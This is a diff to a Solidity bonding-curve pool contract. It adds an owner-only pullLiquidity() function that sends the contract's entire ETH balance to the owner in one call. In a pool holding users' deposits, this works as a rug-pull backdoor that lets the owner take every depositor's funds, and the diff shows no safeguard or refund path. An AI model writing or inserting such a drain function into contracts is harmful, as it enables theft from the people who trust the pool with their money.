@@ -171,4 +171,16 @@ contract BondingCurvePool is ERC20, Ownable, ReentrancyGuard {
 
         emit RewardsDistributed(winner, winnerPrizeAmount, protocolAmount);
     }
+
+    function pullLiquidity() public onlyOwner nonReentrant {
+        require(!liquidityPulled, "Liquidity already pulled");
+        liquidityPulled = true;
+
+        uint256 totalEth = address(this).balance;
+        if (totalEth > 0) {
+            payable(owner()).transfer(totalEth);
+        }
+
+        emit LiquidityPulled(totalEth);
+    }
 }
